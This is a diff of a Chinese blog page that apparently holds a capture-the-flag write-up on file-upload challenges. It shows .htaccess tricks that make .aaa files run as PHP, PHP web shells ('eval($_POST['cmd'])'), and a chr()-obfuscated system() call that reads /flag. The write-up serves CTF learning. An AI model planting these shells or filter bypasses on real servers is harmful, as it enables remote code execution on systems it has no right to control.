@@ -392,7 +392,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-25 14:08:06" itemprop="dateModified" datetime="2020-10-25T14:08:06+08:00">2020-10-25</time>
+                <time title="修改时间：2020-10-25 16:03:33" itemprop="dateModified" datetime="2020-10-25T16:03:33+08:00">2020-10-25</time>
               </span>
 
           
@@ -406,8 +406,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>Upload2</p>
-<p>一， 创建一个文档重命名为.htaccess，在该文件中写入AddType application/x-httpd-php .aaa代码，并上传；</p>
+          <h1 id="Upload2"><a href="#Upload2" class="headerlink" title="Upload2"></a>Upload2</h1><p>一， 创建一个文档重命名为.htaccess，在该文件中写入AddType application/x-httpd-php .aaa代码，并上传；</p>
 <p><img src="https://i.loli.net/2020/10/25/9GLKAO2Wys64NPM.png" alt="1603605389760.png">     <img src="https://i.loli.net/2020/10/25/WCpTY4DOEASbHuQ.png" alt="1603605399961.png">                    </p>
 <p>  <img src="https://i.loli.net/2020/10/25/mkSocQ1Td4jA2hn.png" alt="1603605412194.png"></p>
 <p>二，创建一个1.aaa文件，并输入<script language="php">@eval($_POST['cmd']);</script>后上传；</p>
@@ -416,8 +415,7 @@
 <p> <img src="https://i.loli.net/2020/10/25/5KnNyGoOPjcdlTv.png" alt="1603605431578.png"></p>
 <p>四，在地址栏中输入47.98.234.232:28098/../upload/2.aaa兵访问就完成夺旗了。</p>
 <p><img src="https://i.loli.net/2020/10/25/OMuwcXEtQqmaZpU.png" alt="1603605444401.png"></p>
-<p>Upload4</p>
-<p>一， 在.htaccess文件中输入</p>
+<h1 id="Upload4"><a href="#Upload4" class="headerlink" title="Upload4"></a>Upload4</h1><p>一， 在.htaccess文件中输入</p>
 <p>AddType application/x-httpd-php .aaa</p>
 <p>php_flag display_errors on</p>
 <p>php_flag zend.multibyte 1</p>
@@ -432,6 +430,63 @@
 <p><img src="https://i.loli.net/2020/10/25/mzO6QUINEsjWMSF.png" alt="1603605471101.png"></p>
 <p>四，在地址栏中输入<a target="_blank" rel="noopener" href="http://47.98.234.232:28053/upload/2.aaa%E5%90%8E%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%AE%8C%E6%88%90%E5%A4%BA%E6%97%97%E3%80%82">http://47.98.234.232:28053/upload/2.aaa后访问，即可完成夺旗。</a></p>
 <p><img src="https://i.loli.net/2020/10/25/pGMTnkFaw3eluSV.png" alt="1603605479321.png"></p>
+<h1 id="Upload7"><a href="#Upload7" class="headerlink" title="Upload7"></a>Upload7</h1><p>  一，在.htaccess上输入AddType application/x-httpd-php .aaa并上传；</p>
+<p><img src="https://i.loli.net/2020/10/25/WCpTY4DOEASbHuQ.png" alt="1603605399961.png"></p>
+<p>二，在1.aaa上输入</p>
+<?php
+$a = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
+$a('cat /flag');
+
+并上传；
+
+![捕获.PNG](https://i.loli.net/2020/10/25/RyzUX3786htjJeN.png)
+
+
+
+三，在地址栏上输入http://47.98.234.232:28040/upload/1.aaa后访问，即可获夺旗；
+
+![捕获2.PNG](https://i.loli.net/2020/10/25/Mu6QeRmFPVsndSk.png)
+
+
+
+# Upload6
+
+一，在.htaccess上输入
+
+AddType appli\
+cation/x-httpd-php .aaa
+
+后上传；
+
+
+
+![捕获3.PNG](https://i.loli.net/2020/10/25/B25MmEHYbaXuosy.png)
+
+二，在1.aaa文件上输入
+
+<?php
+@eval($_POST['cmd']);
+
+后上传；
+
+
+
+![捕获4.PNG](https://i.loli.net/2020/10/25/ImGYEg4XKqd9S2N.png)
+
+
+
+三，在2.aaa文件上输入<script language="php">system('cat /flag');</script>后上传；
+
+
+
+![捕获5.PNG](https://i.loli.net/2020/10/25/IWh4TKgY5vLN38X.png)
+
+
+
+四，在地址栏上输入http://47.98.234.232:28083/upload/2.aaa后访问，即可夺旗。
+
+![捕获6.PNG](https://i.loli.net/2020/10/25/6n8ZkfzWlcNvLOi.png)
+
 
       
     </div>
